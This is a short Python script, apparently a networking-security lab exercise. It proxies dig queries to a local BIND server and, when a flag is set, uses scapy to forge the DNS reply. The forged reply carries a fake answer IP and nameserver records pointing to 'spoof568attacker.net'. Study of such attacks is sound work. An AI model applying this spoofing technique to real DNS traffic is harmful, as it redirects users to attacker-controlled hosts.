#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument(
    "--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument(
    "--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true",
                    help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
# Localhost address
LOCALHOST = "127.0.0.1"
# Buffer Size
BUFFER_SIZE = 4096 

if __name__ == "__main__":
    # Create UDP sockets for proxy
    # FIXME connection failed when using ANY
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind((LOCALHOST, port))
    print("Socket binds to %s:%s..."%(LOCALHOST, port))
    # Listen to incomming connections
    while (True):
        data, dig_address = server.recvfrom(BUFFER_SIZE)
        if (len(data) != 0):
            print("Received data from Dig at %s:%s..."%(dig_address[0], dig_address[1]))
        else:
            print("Error! Received zero-length data")
            exit(1)
        # Forward to BIND
        client.sendto(data, (LOCALHOST, dns_port))
        print("Forwarded data to BIND at %s:%s..."%(LOCALHOST, dns_port))
        # Listen for response
        response_data = client.recv(BUFFER_SIZE)
        if (len(response_data) != 0):
            print("Received data from BIND...")
        else:
            print("Error! Received zero-length data")
            exit(1)
        '''=======================================Part3======================================='''
        if (SPOOF):
            print("Spoofing the message...")
            # Parse the raw data to DNS packet
            response_data = DNS(response_data)
            # Spoof the IP address
            response_data.an[0].rdata = '1.11.111.9'
            # Change the name servers
            response_data.ns[0].rdata = 'ns1.spoof568attacker.net'
            response_data.ns[1].rdata = 'ns2.spoof568attacker.net'
            # Remove additional section
            response_data.arcount = 0
        '''==================================================================================='''
        # Reply to dig
        server.sendto(bytes(response_data), dig_address)
        print("Replied back to Dig...")
